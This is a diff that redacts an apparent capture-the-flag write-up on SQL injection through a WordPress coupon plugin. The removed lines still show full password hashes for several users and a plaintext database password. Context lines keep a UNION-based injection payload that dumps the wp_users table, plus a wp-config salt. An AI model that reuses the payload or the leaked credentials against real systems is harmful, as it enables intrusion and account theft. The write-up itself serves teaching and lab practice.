@@ -199,10 +199,10 @@ So now we know what we ask for! Lets Dump the useful stuff!
 
 Response:
    Coupon Code : 12345 With ID : 1 And With Expire Date Of : doesnotexpire Is Valid!
-   Coupon Code : With ID : And With Expire Date Of : admin:$P$BoyfR2QzhNjRNmQZpva6TuuD0EE31B. Is Valid!
-   Coupon Code : With ID : And With Expire Date Of : wp_jeffrey:$P$BU8QpWD.kHZv3Vd1r52ibmO913hmj10 Is Valid!
-   Coupon Code : With ID : And With Expire Date Of : wp_yura:$P$B6jSC3m7WdMlLi1/NDb3OFhqv536SV/ Is Valid!
-   Coupon Code : With ID : And With Expire Date Of : wp_eagle:$P$BpyTRbmvfcKyTrbDzaK1zSPgM7J6QY/ Is Valid!
+   Coupon Code : With ID : And With Expire Date Of : admin:$P$Boy[***]E31B. Is Valid!
+   Coupon Code : With ID : And With Expire Date Of : wp_jeffrey:$P$BU8QpW[***]913hmj10 Is Valid!
+   Coupon Code : With ID : And With Expire Date Of : wp_yura:$P$B6jSC3m[***]36SV/ Is Valid!
+   Coupon Code : With ID : And With Expire Date Of : wp_eagle:$P$BpyT[***]1zSPgM7J6QY/ Is Valid!
 ```
 Nice ❤
 
@@ -231,8 +231,8 @@ I enumerated the rest of the columns and found nothing more valuable that these 
 ' OR 1=1 UNION ALL SELECT NULL,NULL,concat(0x28,user_login,0x3a,user_activation_key,0x29) FROM wordpress.wp_users -- -
 
 Response:
-   Coupon Code : With ID : And With Expire Date Of : (admin:1653007217:$P$BXuW77/My0s1ULQmkWaLEnoGljjLW5/) Is Valid!
-   Coupon Code : With ID : And With Expire Date Of : (wp_jeffrey:1611261290:$P$BufzJsT0fhM94swehg1bpDVTupoxPE0) Is Valid!
+   Coupon Code : With ID : And With Expire Date Of : (admin:1653007217:$P$BXuW77[***]oGljjLW5/) Is Valid!
+   Coupon Code : With ID : And With Expire Date Of : (wp_jeffrey:1611261290:$P$BufzJs[***]upoxPE0) Is Valid!
 ```
 
 Login with user wp_yura:
@@ -292,7 +292,7 @@ define( 'NONCE_SALT',       'gK~TMo/<3*8X0N7G}D{2$&A$5E1^Hv$}`U<=lLa`{<50n1BgRUu
 define( 'DB_USER', 'root' );
 
 /** MySQL database password */
-define( 'DB_PASSWORD', 'root123@#59' );
+define( 'DB_PASSWORD', 'r[***]9' );
 
 ```
 This Password does not work with any user account.
